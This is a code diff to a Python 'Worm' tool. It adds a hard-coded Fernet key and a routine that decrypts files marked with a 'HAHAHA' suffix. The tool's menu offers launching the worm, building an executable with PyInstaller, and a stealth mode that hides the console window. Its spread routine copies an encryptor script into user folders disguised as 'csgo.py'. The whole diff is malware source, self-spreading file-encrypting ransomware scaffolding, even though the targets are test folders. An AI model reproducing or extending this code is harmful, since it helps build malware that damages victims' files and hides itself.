@@ -7,6 +7,7 @@ import shutil
 import win32con
 import win32gui
 import random
+from cryptography.fernet import Fernet
 from os import system
 
 import base64
@@ -16,6 +17,7 @@ from Crypto.Cipher import AES
 ROOTDIR = r"C:\\"
 THIS_DIR = os.path.dirname(os.path.realpath(__file__))
 ENCRYPTOR_PATH = os.path.join(sys.path[0], "encryptor.py")
+KEY = b'k6XGrVRO4bCexC54uWlJgKPx9KloztECXpA-LywXDKo='
 
 class Worm:
     def __init__(self):
@@ -38,7 +40,6 @@ class Worm:
 
         self.directories_found = True
 
-# C:/Program Files/Windows NT/Accessories -> target_dir_list[30]
     def spread(self):
         this = open(ENCRYPTOR_PATH, "r")
         worm_poli = ""
@@ -52,7 +53,7 @@ class Worm:
         for line in this:
             worm_poli += line
 
-        target_list = ["C:/Users/w0rmer/Downloads/test3", "C:/Users/w0rmer/Documents/test", "C:/Users/w0rmer/Music/test2"]
+        target_list = ["C:/Users/w0rmer/Downloads/test"]
 
         for target in target_list:
             shutil.copy(ENCRYPTOR_PATH, target + "/csgo.py")
@@ -61,25 +62,25 @@ class Worm:
 
 
     def decrypt_files(self):
-        pass
+        for (_, _, filenames) in os.walk(THIS_DIR):
+            break
 
-    def decrypt_data(self, data, filename):
-        pass
-        # with open(filename, "rb") as file:
-        #     key = file.read(24)
+        fer = Fernet(KEY)
 
-        # data = base64.b64decode(data)
-        # iv = data[:AES.block_size]
-        # cipher = AES.new(key, AES.MODE_CFB, iv)
-        # decrypted = cipher.decrypt(data[16:])
+        for file in filenames:
+            if file.endswith("HAHAHA"):
+                with open(file, "rb") as f:
+                    data = f.read()
 
-        # return decrypted
+                decrypted = fer.decrypt(data)
+
+                with open(file.split("HAHAHA")[0], "wb") as file_dec:
+                    file_dec.write(decrypted)
 
     def execute_worm(self):
         if not self.directories_found:
             self.find_directories()
 
-        # print(self.target_dir_list)
         # self.spread()
 
 def banner_func():
@@ -96,45 +97,48 @@ def worm_menu():
     print('| [+] 1 => Launch Worm            |')
     print('| [+] 2 => Make It Executable     |')
     print('| [+] 3 => Run Worm in Stealth    |')
-    print('| [+] 4 => Decrypt files(meh)     |')
+    print('| [+] 4 => Decrypt files          |')
     print('| [!] 0 => Exit                   |')
     print(' --------------------------------- ')
 
 if __name__ == "__main__":
     system("cls")
-
     banner_func()
-    time.sleep(3)
 
     worm = Worm()
 
     opt = int
     while opt != 0:
+        time.sleep(0.5)
         worm_menu()
         opt = int(input("Operation: "))
-        time.sleep(1)
         match opt:
             case 1: # modo normal
-                print("[!] Running Worm!")
+                print("[+] Running Worm!")
                 worm.execute_worm()
+                print("[+] Done!")
+                time.sleep(1)
             case 2: # criação de executável
                 print("[+] Creating EXE of Worm!")
                 time.sleep(1)
 
                 os.system("pyinstaller resistencia-exe.py --onefile --name resistencia")
-                print("[!] csgo.exe Created")
+                print("[+] resistencia.exe Created")
+                time.sleep(1)
             case 3: # modo furtivo
                 hide = win32gui.GetForegroundWindow()
                 win32gui.ShowWindow(hide, win32con.SW_HIDE)
                 worm.execute_worm()
                 sys.exit(0)
             case 4: # desencriptar ficheiros
-                print("doesn't work :( (yet)")
-                pass
+                print("[+] Decrypting files!")
+                worm.decrypt_files()
+                print("[+] Done!")
+                time.sleep(1)
             case 0:
                 print("[!] Quitting...")
                 time.sleep(0.5)
                 break
             case _:
                 print("[!] Invalid Option.")
-                print("[!] Try again")
+                print("[!] Try again...")
